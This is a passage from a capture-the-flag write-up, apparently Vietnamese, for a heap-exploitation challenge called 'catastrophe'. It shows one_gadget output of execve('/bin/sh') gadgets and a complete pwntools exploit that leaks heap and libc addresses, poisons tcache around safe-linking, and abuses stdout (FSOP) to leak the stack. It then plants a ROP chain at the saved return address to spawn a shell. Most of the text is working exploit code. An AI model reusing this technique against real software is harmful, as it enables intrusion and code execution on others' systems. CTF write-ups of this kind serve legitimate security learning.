  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebcf8 execve("/bin/sh", rsi, rdx)
constraints:
  address rbp-0x78 is writable
  [rsi] == NULL || rsi == NULL || rsi is a valid argv
  [rdx] == NULL || rdx == NULL || rdx is a valid envp

0xebd52 execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  r13 == NULL || {"/bin/sh", r13, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xebda8 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  r12 == NULL || {"/bin/sh", r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebdaf execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x48 is writable
  rax == NULL || {rax, r12, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp

0xebdb3 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
```

FINALLY !!!

![here](/assets/images/finally.png)

full exp : 

```
#!/usr/bin/env python3

from pwn import *

exe = ELF("./catastrophe_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()

def malloc(idx,size,data):
    p.sendlineafter(b'> ',b'1')
    p.sendlineafter(b'> ',f'{idx}'.encode())
    p.sendlineafter(b'> ',f'{size}'.encode())
    p.sendlineafter(b'content: ',data)

def free(idx):
    p.sendlineafter(b'> ',b'2')
    p.sendlineafter(b'> ',f'{idx}'.encode())

def view(idx):
    p.sendlineafter(b'> ',b'3')
    p.sendlineafter(b'> ',f'{idx}'.encode())
def obfuscate(p, adr):
    return p^(adr>>12)


for i in range(7): malloc(i,0x100,b'a')

free(0)
view(0)
heap_base = u64(p.recv(5).ljust(8,b'\x00')) * 0x1000
log.info(f'heap base: {hex(heap_base)}')

malloc(0,0x100,b'a')

malloc(7,0x100,b'a')
malloc(8,0x100,b'a')

malloc(9,0x10,b'c')

for i in range(7): free(i)
free(7)
view(7)
libc.address = u64(p.recv(6).ljust(8,b'\x00')) - 0x219ce0
environ = libc.sym.environ
binsh = next(libc.search(b'/bin/sh\x00'))
stdout = libc.address + 0x21a780
log.info(f'libc: {hex(libc.address)}')
log.info(f'environ: {hex(environ)}')
log.info(f'binsh: {hex(binsh)}')
log.info(f'stdout: {hex(stdout)}')

free(8)
malloc(0,0x100,b'a')
free(8)
# overwrite fd
payload = b'a'*0x108 + p64(0x111) + p64(obfuscate(stdout,heap_base))
malloc(1,0x130,payload)
malloc(2,0x100,b'nothing')

payload = flat(
        0xfbad1800,
        libc.sym.environ,
        libc.sym.environ,
        libc.sym.environ,
        libc.sym.environ,
        libc.sym.environ+8,
        libc.sym.environ+8,
        libc.sym.environ+8,
        libc.sym.environ+8,
        )

malloc(3,0x100,payload)
environ_stack = u64(p.recv(6).ljust(8,b'\x00'))
saved_rbp = environ_stack - 0x138
saved_rip = environ_stack - 0x130
log.info(f'stack_leak: {hex(environ_stack)}')
log.info(f'saved_rbp: {hex(saved_rbp)}')
log.info(f'saved_rip: {hex(saved_rip)}')



input()
free(1)
free(2)

payload2 = flat(
        b'a'*0x108 + p64(0x111) + p64(obfuscate(saved_rbp,heap_base))
        )
pop_rsi = libc.address + 0x0000000000126101
pop_rdi = 0x000000000002a3e5
pop_rdx_rbx = libc.address + 0x0000000000090529

input()
payload3 = p64(heap_base+0x78)
payload3 += p64(pop_rsi) + p64(0)
payload3 += p64(pop_rdx_rbx) + p64(0)*2
payload3 += p64(0xebcf8+libc.address)  #rsi null , rdx null
malloc(5,0x130,payload2)
malloc(6,0x100,b'nothing')
malloc(7,0x100,payload3)

p.interactive()
```

ref : 

[1 bài kĩ thuật tương tự](https://ret2school.github.io/post/mailman/)

[1 writeup khác](https://zenn.dev/t0m3y/articles/d42397182c694d#fsop)

[safe_linking](https://fascinating-confusion.io/posts/2020/11/csr20-howtoheap-writeup/)

